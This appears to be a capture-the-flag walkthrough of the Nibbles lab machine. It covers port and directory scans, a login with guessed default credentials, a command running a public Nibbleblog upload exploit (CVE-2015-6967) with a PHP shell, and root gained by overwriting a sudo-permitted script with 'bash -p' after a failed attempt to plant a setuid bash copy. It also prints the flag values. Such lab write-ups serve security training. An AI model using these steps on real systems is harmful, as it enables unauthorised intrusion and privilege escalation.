
```
nmap -sV 10.10.10.75                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 02:22 CEST
Nmap scan report for 10.10.10.75
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds
```

if we inspect the page of the site 

```
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

lets go to 
```
/nibbleblog
```

```
feroxbuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/seclists/PathBANGER.txt -r -C 404 -x php,sh,cgi 
                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.75/nibbleblog/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/PathBANGER.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, sh, cgi]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       11l       13w      402c http://10.10.10.75/nibbleblog/sitemap.php
200      GET        2l        6w       95c http://10.10.10.75/nibbleblog/content/private/pages.xml
200      GET        2l       13w      370c http://10.10.10.75/nibbleblog/content/private/users.xml
200      GET        2l        6w       93c http://10.10.10.75/nibbleblog/content/private/posts.xml
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/content/private/keys.php
200      GET        2l       21w      325c http://10.10.10.75/nibbleblog/content/private/categories.xml
200      GET       46l      203w    21457c http://10.10.10.75/nibbleblog/content/public/upload/nibbles_0_nbmedia.jpg
200      GET      107l      603w    72467c http://10.10.10.75/nibbleblog/content/public/upload/nibbles_0_thumb.jpg
200      GET      303l      967w   114530c http://10.10.10.75/nibbleblog/content/public/upload/nibbles_0_o.jpg
200      GET        8l       15w      302c http://10.10.10.75/nibbleblog/feed.php
200      GET       20l      104w     1741c http://10.10.10.75/nibbleblog/themes/
200      GET       21l       59w      559c http://10.10.10.75/nibbleblog/themes/medium/init.bit
200      GET       22l       70w      688c http://10.10.10.75/nibbleblog/themes/medium/config.bit
200      GET       15l       45w      469c http://10.10.10.75/nibbleblog/themes/echo/config.bit
200      GET       43l      197w    16352c http://10.10.10.75/nibbleblog/themes/techie/screenshot.jpg
200      GET       30l       99w     1073c http://10.10.10.75/nibbleblog/themes/techie/config.bit
200      GET       61l      168w     2987c http://10.10.10.75/nibbleblog/
200      GET       61l      168w     2987c http://10.10.10.75/nibbleblog/index.php
200      GET       16l       51w      555c http://10.10.10.75/nibbleblog/themes/note-2/config.bit
200      GET       99l      597w    48368c http://10.10.10.75/nibbleblog/themes/simpler/screenshot.jpg
200      GET       71l      358w    27337c http://10.10.10.75/nibbleblog/themes/note-2/screenshot.jpg
200      GET       96l      507w    38409c http://10.10.10.75/nibbleblog/themes/echo/screenshot.jpg
200      GET       67l      147w     1530c http://10.10.10.75/nibbleblog/themes/medium/templates/default.bit
200      GET       10l       24w      323c http://10.10.10.75/nibbleblog/themes/techie/js/browser-update.js
200      GET       21l       53w      615c http://10.10.10.75/nibbleblog/themes/techie/js/taglist.js
200      GET       10l       27w     1728c http://10.10.10.75/nibbleblog/themes/echo/js/script.js
200      GET       43l      143w    28199c http://10.10.10.75/nibbleblog/themes/medium/js/rainbow-custom.min.js
200      GET       71l      165w     1955c http://10.10.10.75/nibbleblog/themes/note-2/templates/default.bit
200      GET      426l      614w    10275c http://10.10.10.75/nibbleblog/themes/echo/css/style.css
200      GET       50l      155w    28396c http://10.10.10.75/nibbleblog/themes/note-2/js/scripts.js
200      GET        2l        6w       97c http://10.10.10.75/nibbleblog/content/private/tags.xml
200      GET        2l       45w     1142c http://10.10.10.75/nibbleblog/content/private/notifications.xml
200      GET        2l       14w      431c http://10.10.10.75/nibbleblog/content/private/comments.xml
200      GET        2l       50w     1936c http://10.10.10.75/nibbleblog/content/private/config.xml
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/content/private/shadow.php
200      GET       16l       33w      463c http://10.10.10.75/nibbleblog/themes/simpler/config.bit
200      GET       18l       82w     1353c http://10.10.10.75/nibbleblog/content/
200      GET       55l      348w    27055c http://10.10.10.75/nibbleblog/themes/medium/screenshot.jpg
200      GET       85l      155w     1672c http://10.10.10.75/nibbleblog/themes/simpler/css/page.css
200      GET      171l      270w     3027c http://10.10.10.75/nibbleblog/themes/simpler/css/main.css
200      GET       88l      191w     1473c http://10.10.10.75/nibbleblog/themes/medium/css/rainbow.css
200      GET       84l      155w     1671c http://10.10.10.75/nibbleblog/themes/medium/css/page.css
200      GET       77l      120w     1340c http://10.10.10.75/nibbleblog/themes/medium/css/plugins.css
200      GET      262l      483w     4839c http://10.10.10.75/nibbleblog/themes/simpler/css/post.css
200      GET      110l      175w     1986c http://10.10.10.75/nibbleblog/themes/medium/css/main.css
200      GET       35l       57w     1729c http://10.10.10.75/nibbleblog/themes/simpler/css/normalize.css
200      GET      154l      298w     2879c http://10.10.10.75/nibbleblog/themes/medium/css/post.css
200      GET       77l      120w     1340c http://10.10.10.75/nibbleblog/themes/simpler/css/plugins.css
200      GET       88l      191w     1473c http://10.10.10.75/nibbleblog/themes/simpler/css/rainbow.css
200      GET       35l       57w     1729c http://10.10.10.75/nibbleblog/themes/medium/css/normalize.css
200      GET       22l      126w     2127c http://10.10.10.75/nibbleblog/admin/
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/plugin.class.php
200      GET       15l       16w      468c http://10.10.10.75/nibbleblog/admin/boot/feed.bit
200      GET       25l       24w      767c http://10.10.10.75/nibbleblog/admin/boot/blog.bit
200      GET       21l       20w      618c http://10.10.10.75/nibbleblog/admin/boot/admin.bit
200      GET       13l       15w      430c http://10.10.10.75/nibbleblog/admin/boot/ajax.bit
200      GET        9l       10w      248c http://10.10.10.75/nibbleblog/admin/ajax/security.bit
200      GET       71l      116w     1240c http://10.10.10.75/nibbleblog/admin/js/ajax_form.bit
200      GET       51l       99w      902c http://10.10.10.75/nibbleblog/admin/js/functions.js
200      GET        1l       21w      277c http://10.10.10.75/nibbleblog/admin/js/system.php
200      GET        1l        3w       86c http://10.10.10.75/nibbleblog/admin/ajax/uploader%20(copy).php
200      GET        1l        3w       86c http://10.10.10.75/nibbleblog/admin/ajax/posts_get_video_info.php
200      GET        1l        3w       86c http://10.10.10.75/nibbleblog/admin/ajax/comments.php
200      GET        1l        3w       86c http://10.10.10.75/nibbleblog/admin/ajax/posts.php
200      GET        1l        3w       86c http://10.10.10.75/nibbleblog/admin/ajax/pages.php
200      GET        1l        3w       86c http://10.10.10.75/nibbleblog/admin/ajax/uploader.php
200      GET        1l        3w       86c http://10.10.10.75/nibbleblog/admin/ajax/categories.php
200      GET        1l        2w       13c http://10.10.10.75/nibbleblog/admin/ajax/mobile.php
200      GET        1l        3w       86c http://10.10.10.75/nibbleblog/admin/ajax/settings.php
200      GET       21l       56w      693c http://10.10.10.75/nibbleblog/themes/techie/js/sidebar.js
200      GET       89l      186w     2347c http://10.10.10.75/nibbleblog/themes/techie/templates/default.bit
200      GET       68l      141w     1634c http://10.10.10.75/nibbleblog/themes/echo/templates/default.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/defensio/Defensio.php
200      GET       38l       83w     1068c http://10.10.10.75/nibbleblog/admin/templates/login/index.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/db_users.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/nbxml.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/db_comments.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/db_posts.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/db_notifications.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/db_settings.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/db_pages.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/db_tags.class.php
200      GET       15l       19w      112c http://10.10.10.75/nibbleblog/admin/boot/rules/99-misc.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/db/db_categories.class.php
200      GET       78l      194w     2720c http://10.10.10.75/nibbleblog/admin/templates/easy4/index.bit
200      GET       75l      176w     2090c http://10.10.10.75/nibbleblog/admin/boot/rules/10-pager.bit
200      GET       61l      153w     1869c http://10.10.10.75/nibbleblog/admin/boot/rules/5-url.bit
200      GET      112l      227w     2925c http://10.10.10.75/nibbleblog/admin/boot/rules/98-blog.bit
200      GET       37l       53w      824c http://10.10.10.75/nibbleblog/admin/boot/rules/98-constants.bit
200      GET       16l       21w      175c http://10.10.10.75/nibbleblog/admin/boot/rules/4-blacklist.bit
200      GET      160l      375w     4744c http://10.10.10.75/nibbleblog/admin/js/reveal/jquery.reveal.js
200      GET       96l      325w     3796c http://10.10.10.75/nibbleblog/admin/boot/rules/2-objects.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/api/comment.class.php
200      GET       17l       24w      531c http://10.10.10.75/nibbleblog/admin/controllers/dashboard/view.bit
200      GET       25l       40w      747c http://10.10.10.75/nibbleblog/admin/controllers/page/list.bit
200      GET       65l      111w     1556c http://10.10.10.75/nibbleblog/admin/controllers/page/new.bit
200      GET       71l      127w     1745c http://10.10.10.75/nibbleblog/admin/controllers/page/edit.bit
200      GET       43l      143w    28395c http://10.10.10.75/nibbleblog/themes/techie/js/rainbow-custom.min.js
200      GET       14l       14w      356c http://10.10.10.75/nibbleblog/admin/controllers/plugins/list.bit
200      GET       28l       48w      932c http://10.10.10.75/nibbleblog/admin/views/settings/themes.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/resize.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/number.class.php
200      GET       19l       34w      549c http://10.10.10.75/nibbleblog/admin/controllers/plugins/install.bit
200      GET       64l      208w     3738c http://10.10.10.75/nibbleblog/admin/views/settings/image.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/email.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/html.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/redirect.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/image.class.php
200      GET       59l      179w     3220c http://10.10.10.75/nibbleblog/admin/views/settings/notifications.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/page.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/validation.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/cookie.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/date.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/post.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/session.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/category.class.php
200      GET       16l       19w      355c http://10.10.10.75/nibbleblog/admin/controllers/plugins/uninstall.bit
200      GET       59l      118w     1969c http://10.10.10.75/nibbleblog/admin/controllers/plugins/config.bit
200      GET       97l      309w     4774c http://10.10.10.75/nibbleblog/admin/views/settings/general.bit
200      GET       67l      162w     2713c http://10.10.10.75/nibbleblog/admin/views/settings/regional.bit
200      GET       51l      158w     2365c http://10.10.10.75/nibbleblog/admin/views/settings/username.bit
200      GET      125l      346w     5337c http://10.10.10.75/nibbleblog/admin/views/settings/seo.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/blog.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/social.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/filesystem.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/language.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/crypt.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/net.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/url.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/text.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/pager.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/plugin.class.php
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/helpers/video.class.php
200      GET       19l       45w      728c http://10.10.10.75/nibbleblog/admin/views/plugins/config.bit
200      GET       26l       69w     1278c http://10.10.10.75/nibbleblog/admin/views/plugins/list.bit
200      GET       27l       51w      754c http://10.10.10.75/nibbleblog/admin/controllers/categories/list.bit
200      GET       33l       66w     1014c http://10.10.10.75/nibbleblog/admin/controllers/categories/edit.bit
200      GET      130l      224w     3049c http://10.10.10.75/nibbleblog/admin/views/comments/list.bit
200      GET       81l      265w     4729c http://10.10.10.75/nibbleblog/admin/views/comments/settings.bit
200      GET       14l       25w      524c http://10.10.10.75/nibbleblog/admin/controllers/post/list.bit
200      GET       14l       22w      526c http://10.10.10.75/nibbleblog/admin/controllers/comments/settings.bit
200      GET      109l      229w     3125c http://10.10.10.75/nibbleblog/admin/controllers/post/edit.bit
200      GET       25l       74w     1127c http://10.10.10.75/nibbleblog/admin/views/user/login.bit
200      GET       14l       23w      530c http://10.10.10.75/nibbleblog/admin/controllers/comments/list.bit
200      GET       11l       22w      305c http://10.10.10.75/nibbleblog/admin/views/user/send_forgot.bit
200      GET       41l       80w     1502c http://10.10.10.75/nibbleblog/admin/controllers/user/login.bit
200      GET       19l       53w      763c http://10.10.10.75/nibbleblog/admin/views/user/forgot.bit
200      GET       44l       59w     1164c http://10.10.10.75/nibbleblog/admin/controllers/user/send_forgot.bit
200      GET       51l      100w     1484c http://10.10.10.75/nibbleblog/admin/controllers/user/forgot.bit
200      GET        1l       47w     3532c http://10.10.10.75/nibbleblog/admin/js/tinymce/jquery.tinymce.min.js
200      GET       11l       14w      352c http://10.10.10.75/nibbleblog/admin/controllers/settings/seo.bit
200      GET       11l       14w      352c http://10.10.10.75/nibbleblog/admin/controllers/settings/notifications.bit
200      GET        7l        4w       75c http://10.10.10.75/nibbleblog/admin/controllers/user/logout.bit
200      GET       36l       45w      698c http://10.10.10.75/nibbleblog/admin/views/post/edit.bit
200      GET       31l       38w      593c http://10.10.10.75/nibbleblog/admin/views/post/new_quote.bit
200      GET       90l      172w     2458c http://10.10.10.75/nibbleblog/admin/views/categories/list.bit
200      GET       13l       34w      412c http://10.10.10.75/nibbleblog/admin/controllers/settings/general.bit
200      GET       25l       34w      385c http://10.10.10.75/nibbleblog/admin/views/dashboard/view.bit
200      GET       89l      156w     2079c http://10.10.10.75/nibbleblog/admin/controllers/post/new.bit
200      GET      178l      405w     4144c http://10.10.10.75/nibbleblog/themes/techie/css/page.css
200      GET       94l      183w     1707c http://10.10.10.75/nibbleblog/themes/techie/css/plugins.css
200      GET        4l     1304w    83615c http://10.10.10.75/nibbleblog/admin/js/jquery/jquery.js
200      GET       10l     3958w   260266c http://10.10.10.75/nibbleblog/admin/js/tinymce/tinymce.min.js
200      GET       83l      177w     1852c http://10.10.10.75/nibbleblog/themes/simpler/templates/default.bit
200      GET       27l       96w     1401c http://10.10.10.75/nibbleblog/admin.php
200      GET        1l      163w    12207c http://10.10.10.75/nibbleblog/themes/note-2/css/styles.min.css
200      GET       54l       95w     1250c http://10.10.10.75/nibbleblog/admin/boot/rules/98-comments.bit
200      GET       91l      333w     7130c http://10.10.10.75/nibbleblog/admin/boot/rules/11-admin.bit
200      GET      378l      554w    13600c http://10.10.10.75/nibbleblog/themes/note-2/css/styles.css
200      GET       30l      214w     3777c http://10.10.10.75/nibbleblog/plugins/
200      GET       25l       41w      580c http://10.10.10.75/nibbleblog/plugins/slogan/plugin.bit
200      GET       19l       29w      255c http://10.10.10.75/nibbleblog/plugins/hello/plugin.bit
200      GET       36l       61w      805c http://10.10.10.75/nibbleblog/plugins/categories/plugin.bit
200      GET       56l      112w     1439c http://10.10.10.75/nibbleblog/plugins/analytics/plugin.bit
200      GET       68l      134w     1688c http://10.10.10.75/nibbleblog/plugins/tag_cloud/plugin.bit
200      GET       42l       70w      951c http://10.10.10.75/nibbleblog/plugins/html_code/plugin.bit
200      GET       59l       99w     1283c http://10.10.10.75/nibbleblog/plugins/latest_posts/plugin.bit
200      GET       39l       65w      898c http://10.10.10.75/nibbleblog/plugins/pages/plugin.bit
200      GET       42l       69w      934c http://10.10.10.75/nibbleblog/plugins/sponsors/plugin.bit
200      GET       36l       70w     1331c http://10.10.10.75/nibbleblog/plugins/quick_links/plugin.bit
200      GET       86l      217w     2788c http://10.10.10.75/nibbleblog/plugins/open_graph/plugin.bit
200      GET       42l       73w     1016c http://10.10.10.75/nibbleblog/plugins/maintenance_mode/plugin.bit
200      GET       51l      110w     1404c http://10.10.10.75/nibbleblog/plugins/my_image/plugin.bit
200      GET       60l      158w     2197c http://10.10.10.75/nibbleblog/plugins/about/plugin.bit
200      GET       99l      231w     2987c http://10.10.10.75/nibbleblog/plugins/twitter_cards/plugin.bit
200      GET        8l       30w      212c http://10.10.10.75/nibbleblog/plugins/slogan/languages/es_ES.bit
200      GET        8l       34w      249c http://10.10.10.75/nibbleblog/plugins/slogan/languages/fr_FR_bit
200      GET        8l       31w      210c http://10.10.10.75/nibbleblog/plugins/slogan/languages/en_US.bit
200      GET        8l       24w      302c http://10.10.10.75/nibbleblog/plugins/slogan/languages/ru_RU.bit
200      GET        9l       16w      159c http://10.10.10.75/nibbleblog/plugins/latest_posts/languages/en_US.bit
200      GET        9l       19w      183c http://10.10.10.75/nibbleblog/plugins/latest_posts/languages/es_ES.bit
200      GET        9l       16w      270c http://10.10.10.75/nibbleblog/plugins/latest_posts/languages/ru_RU.bit
200      GET        9l       17w      173c http://10.10.10.75/nibbleblog/plugins/latest_posts/languages/fr_FR.bit
200      GET        9l       36w      280c http://10.10.10.75/nibbleblog/plugins/analytics/languages/en_US.bit
200      GET        9l       15w      153c http://10.10.10.75/nibbleblog/plugins/maintenance_mode/languages/en_US.bit
200      GET        8l       11w      106c http://10.10.10.75/nibbleblog/plugins/hello/languages/en_US.bit
200      GET        8l       11w      109c http://10.10.10.75/nibbleblog/plugins/hello/languages/fr_FR.bit
200      GET        9l       17w      161c http://10.10.10.75/nibbleblog/plugins/maintenance_mode/languages/es_ES.bit
200      GET        9l       15w      155c http://10.10.10.75/nibbleblog/plugins/maintenance_mode/languages/fr_FR.bit
200      GET        9l       37w      312c http://10.10.10.75/nibbleblog/plugins/analytics/languages/fr_FR.bit
200      GET        8l       11w      139c http://10.10.10.75/nibbleblog/plugins/hello/languages/ru_RU.bit
200      GET        9l       21w      178c http://10.10.10.75/nibbleblog/plugins/html_code/languages/fr_FR.bit
200      GET        9l       39w      309c http://10.10.10.75/nibbleblog/plugins/analytics/languages/es_ES.bit
200      GET        9l       21w      169c http://10.10.10.75/nibbleblog/plugins/html_code/languages/en_US.bit
200      GET        9l       19w      168c http://10.10.10.75/nibbleblog/plugins/html_code/languages/es_ES.bit
200      GET        9l       19w      207c http://10.10.10.75/nibbleblog/plugins/html_code/languages/ru_RU.bit
200      GET       13l       25w      287c http://10.10.10.75/nibbleblog/plugins/quick_links/languages/en_US.bit
200      GET        8l       26w      194c http://10.10.10.75/nibbleblog/plugins/twitter_cards/languages/en_US.bit
200      GET        9l       15w      219c http://10.10.10.75/nibbleblog/plugins/maintenance_mode/languages/ru_RU.bit
200      GET        8l       17w      134c http://10.10.10.75/nibbleblog/plugins/twitter_cards/languages/es_ES.bit
200      GET        9l       35w      418c http://10.10.10.75/nibbleblog/plugins/analytics/languages/ru_RU.bit
200      GET        8l       23w      274c http://10.10.10.75/nibbleblog/plugins/twitter_cards/languages/ru_RU.bit
200      GET       10l       46w      354c http://10.10.10.75/nibbleblog/plugins/tag_cloud/languages/es_ES.bit
200      GET       12l       32w      303c http://10.10.10.75/nibbleblog/plugins/about/languages/en_US.bit
200      GET       13l       26w      326c http://10.10.10.75/nibbleblog/plugins/quick_links/languages/fr_FR.bit
200      GET        8l       24w      201c http://10.10.10.75/nibbleblog/plugins/categories/languages/fr_FR.bit
200      GET        9l       11w      172c http://10.10.10.75/nibbleblog/plugins/my_image/languages/ru_RU.bit
200      GET       13l       22w      395c http://10.10.10.75/nibbleblog/plugins/quick_links/languages/ru_RU.bit
200      GET        9l       12w      129c http://10.10.10.75/nibbleblog/plugins/my_image/languages/fr_FR.bit
200      GET       10l       42w      306c http://10.10.10.75/nibbleblog/plugins/tag_cloud/languages/en_US.bit
200      GET       12l       33w      455c http://10.10.10.75/nibbleblog/plugins/about/languages/ru_RU.bit
200      GET       13l       30w      332c http://10.10.10.75/nibbleblog/plugins/quick_links/languages/es_ES.bit
200      GET       10l       46w      355c http://10.10.10.75/nibbleblog/plugins/tag_cloud/languages/fr_FR.bit
200      GET       12l       39w      340c http://10.10.10.75/nibbleblog/plugins/about/languages/es_ES.bit
200      GET        8l       12w      109c http://10.10.10.75/nibbleblog/plugins/open_graph/languages/en_US.bit
200      GET        9l       23w      205c http://10.10.10.75/nibbleblog/plugins/sponsors/languages/en_US.bit
200      GET        8l       12w      116c http://10.10.10.75/nibbleblog/plugins/open_graph/languages/ru_RU.bit
200      GET        8l       12w      109c http://10.10.10.75/nibbleblog/plugins/open_graph/languages/es_ES.bit
200      GET        9l       24w      307c http://10.10.10.75/nibbleblog/plugins/sponsors/languages/ru_RU.bit
200      GET        8l       24w      195c http://10.10.10.75/nibbleblog/plugins/twitter_cards/languages/fr_FR.bit
200      GET        8l       22w      187c http://10.10.10.75/nibbleblog/plugins/categories/languages/es_ES.bit
200      GET        9l       30w      249c http://10.10.10.75/nibbleblog/plugins/sponsors/languages/fr_FR.bit
200      GET       10l       34w      481c http://10.10.10.75/nibbleblog/plugins/tag_cloud/languages/ru_RU.bit
200      GET       27l       39w      470c http://10.10.10.75/nibbleblog/admin/boot/rules/5-regional.bit
200      GET       18l       20w      148c http://10.10.10.75/nibbleblog/admin/boot/rules/10-session.bit
200      GET        0l        0w        0c http://10.10.10.75/nibbleblog/admin/kernel/api/login.class.php
200      GET       98l      230w     3382c http://10.10.10.75/nibbleblog/admin/boot/rules/3-variables.bit
200      GET       31l       50w      711c http://10.10.10.75/nibbleblog/admin/boot/rules/10-seo.bit
200      GET       40l       77w      795c http://10.10.10.75/nibbleblog/admin/boot/rules/4-remove_magic.bit
200      GET       30l       37w      563c http://10.10.10.75/nibbleblog/admin/views/page/new.bit
200      GET       77l      144w     1870c http://10.10.10.75/nibbleblog/admin/boot/rules/8-posts_pages_feed.bit
200      GET       89l      195w     3102c http://10.10.10.75/nibbleblog/admin/boot/rules/1-fs_php.bit
200      GET       19l       23w      570c http://10.10.10.75/nibbleblog/admin/controllers/settings/image.bit
200      GET       33l       41w      620c http://10.10.10.75/nibbleblog/admin/views/post/new_simple.bit
200      GET       38l       48w      886c http://10.10.10.75/nibbleblog/admin/controllers/settings/themes.bit
200      GET      105l      209w     2647c http://10.10.10.75/nibbleblog/admin/boot/rules/98-plugins.bit
200      GET       33l      107w     1360c http://10.10.10.75/nibbleblog/admin/views/categories/edit.bit
200      GET       47l      110w     1583c http://10.10.10.75/nibbleblog/admin/controllers/settings/username.bit
200      GET       96l      152w     2439c http://10.10.10.75/nibbleblog/admin/views/page/list.bit
200      GET       95l      156w     2287c http://10.10.10.75/nibbleblog/admin/views/post/list.bit
200      GET      182l      373w     3933c http://10.10.10.75/nibbleblog/admin/boot/rules/8-posts_pages.bit
200      GET       93l      172w     2327c http://10.10.10.75/nibbleblog/admin/views/post/new_video.bit
200      GET       30l       46w      740c http://10.10.10.75/nibbleblog/admin/controllers/settings/regional.bit
200      GET       27l       52w      794c http://10.10.10.75/nibbleblog/admin/views/dashboard/last_comments.bit
200      GET       13l       34w      441c http://10.10.10.75/nibbleblog/admin/controllers/settings/advanced.bit
200      GET       21l       66w     1265c http://10.10.10.75/nibbleblog/admin/views/dashboard/quick_start.bit
200      GET       64l      130w     1845c http://10.10.10.75/nibbleblog/admin/views/dashboard/notifications.bit
200      GET       88l      174w     1622c http://10.10.10.75/nibbleblog/update.php
200      GET        1l       11w       78c http://10.10.10.75/nibbleblog/install.php
200      GET      146l     1032w    82541c http://10.10.10.75/nibbleblog/admin/templates/easy4/css/img/grey.png
200      GET       63l      643w     4628c http://10.10.10.75/nibbleblog/README
200      GET      288l      921w    16627c http://10.10.10.75/nibbleblog/languages/zh_TW.bit
200      GET      288l     1645w    18190c http://10.10.10.75/nibbleblog/languages/pl_PL.bit
200      GET      288l     1748w    17998c http://10.10.10.75/nibbleblog/languages/pt_PT.bit
200      GET      288l     1575w    17763c http://10.10.10.75/nibbleblog/languages/de_DE.bit
200      GET      288l      905w    16495c http://10.10.10.75/nibbleblog/languages/zh_CN.bit
200      GET      287l     1754w    17569c http://10.10.10.75/nibbleblog/languages/nl_NL.bit
200      GET      288l     1797w    18351c http://10.10.10.75/nibbleblog/languages/it_IT.bit
200      GET      288l     2061w    18787c http://10.10.10.75/nibbleblog/languages/vi_VI.bit
200      GET      326l     1740w    17135c http://10.10.10.75/nibbleblog/languages/en_US.bit
200      GET      288l     1942w    19170c http://10.10.10.75/nibbleblog/languages/fr_FR.bit
200      GET      288l     1810w    18341c http://10.10.10.75/nibbleblog/languages/es_ES.bit
200      GET      305l     1646w    25081c http://10.10.10.75/nibbleblog/languages/ru_RU.bit
200      GET       27l      181w     3167c http://10.10.10.75/nibbleblog/languages/
200      GET        9l       12w      123c http://10.10.10.75/nibbleblog/plugins/my_image/languages/en_US.bit
200      GET        8l       22w      173c http://10.10.10.75/nibbleblog/plugins/categories/languages/en_US.bit
200      GET        8l       12w      109c http://10.10.10.75/nibbleblog/plugins/open_graph/languages/fr_FR.bit
200      GET        8l       10w      101c http://10.10.10.75/nibbleblog/plugins/pages/languages/en_US.bit
200      GET        9l       12w      129c http://10.10.10.75/nibbleblog/plugins/my_image/languages/es_ES.bit
200      GET        8l       10w      138c http://10.10.10.75/nibbleblog/plugins/pages/languages/ru_RU.bit
200      GET        8l       20w      268c http://10.10.10.75/nibbleblog/plugins/categories/languages/ru_RU.bit
200      GET       12l       37w      347c http://10.10.10.75/nibbleblog/plugins/about/languages/fr_FR.bit
200      GET        8l       16w      130c http://10.10.10.75/nibbleblog/plugins/pages/languages/es_ES.bit
200      GET        8l       11w      109c http://10.10.10.75/nibbleblog/plugins/pages/languages/fr_FR.bit
200      GET        9l       25w      234c http://10.10.10.75/nibbleblog/plugins/sponsors/languages/es_ES.bit

```

3 pages stand out 

```
http://10.10.10.75/nibbleblog/admin.php -> login page
http://10.10.10.75/nibbleblog/update.php 
http://10.10.10.75/nibbleblog/install.php
```

```
admin
nibbles
```
Tried default creds:  
**Username:** `admin`  
**Password:** `nibbles`  


https://github.com/dix0nym/CVE-2015-6967
```
exploit.py --url 10.10.10.75 --username admin --password nibbles --payload shell.php
```


```
$ cd nibbler
$ ls
personal.zip
user.txt
$ cat user.txt
2db86b8a9793df0b7fd9e0c1286c01ec
```

```
sudo -l
User nibbler may run the following commands on Nibbles:
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Tried to hijack commands like `curl` and `ping` via:
```
PATH=.:$PATH sudo /home/nibbler/personal/stuff/monitor.sh
```
Placed fake binaries in the current directory:
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Didn’t work — script never hit those commands due to how its logic branches were structured. `$#` was never 0, so the good code block never executed.

### Working Exploit: Script Overwrite
Since I could run the script with `sudo` and had write access to it, I replaced it entirely:

```
echo '#!/bin/bash' > /tmp/rootme.sh
echo 'bash -p' >> /tmp/rootme.sh
chmod +x /tmp/rootme.sh
cp /tmp/rootme.sh /home/nibbler/personal/stuff/monitor.sh
```
Then escalated:
```
sudo /home/nibbler/personal/stuff/monitor.sh
```

```
cd /root
cat root.txt
e56b0e20713f1937b8464b4d5c3f7700
```



The user `nibbler` is allowed to run the script `/home/nibbler/personal/stuff/monitor.sh` as **root** without entering a password. This is defined by the `sudo` configuration:
```
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

That alone isn’t a problem — unless the user also has permission to edit that script.

